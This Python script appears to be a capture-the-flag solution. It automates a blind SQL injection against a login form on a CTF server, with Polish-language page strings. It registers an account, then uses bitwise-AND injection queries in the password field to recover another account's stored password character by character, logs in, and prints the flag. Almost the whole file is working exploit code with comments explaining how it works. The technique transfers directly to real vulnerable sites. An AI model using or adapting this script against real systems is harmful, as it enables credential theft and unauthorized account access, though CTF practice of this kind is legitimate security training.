#!/usr/bin/env python3
import random
import requests
import string
import sys


# This program performs blind SQL Injection with bitwise AND.
# Thanks to this fact it is able to find next character in String after 7 requests.
# It is done by checking if consecutive bits of character representation are ones.
# After checking for 64, character is discovered because biggest index in ASCII is 127.


def main():
    url = "http://tasks.ctfd.kncyber.pl:7017/"
    print("[+] process started")
    username = register_or_detect_user(url)
    password = enumerate_password(url, username)
    if password is None:
        print("[!] Creating new account")
        username = register_or_detect_user(url)
        password = enumerate_password(url, username)
    r = requests.post(url, data={'email': username, 'pass': password, "action": "Zaloguj się"})
    print("[!] FLAG:", r.text[219:268])


def detect_active_account(r):
    user_name = ""
    i = 167
    while r.text[i] != "<":
        user_name += r.text[i]
        i += 1
    return user_name


def register_or_detect_user(url):
    """Returns username of active user"""
    generated_username = ''.join(random.choice(string.ascii_letters) for i in range(10))
    r = requests.post(url, data={'email': generated_username, "action": "Zarejestruj się"})
    if "Tylko jeden aktywny użytkownik" in r.text:
        detected_username = detect_active_account(r)
        print("[!] For this IP address user", detected_username, "is already registered")
        return detected_username
    elif "zostało zarejestrowane. Hasło zostało wysłane na Twój email." in r.text:
        print("[+] Account", generated_username, "registered")
        return generated_username


def enumerate_password(url, username):
    position = 1
    character = 0
    password = ""
    i = 1
    while len(password) < 44:
        while i <= 64:
            query = "' OR ASCII(SUBSTR((SELECT pass FROM users WHERE email ='" + username + "')," + \
                    str(position) + ",1)) & BINARY '" + str(i) + "' -- "
            r = requests.post(url, data={'email': username,
                                         'pass': query, "action": "Zaloguj się"})
            if "Witaj, " in r.text:
                character |= i
            elif "Konto zostało zablokowane" in r.text:
                print("\n[!] No more login attempts for", username, "account")
                return None
            i <<= 1
        position += 1
        password += chr(character)
        progress = int(100 * position / 45)
        sys.stdout.write('\033[2K\033[1G')
        sys.stdout.write("\rpassword progress " + str(progress) + "%, now: " + password)
        i = 1
        character = 0
    print("\n[+] password to", username, "account:", password)
    return password


if __name__ == '__main__':
    main()
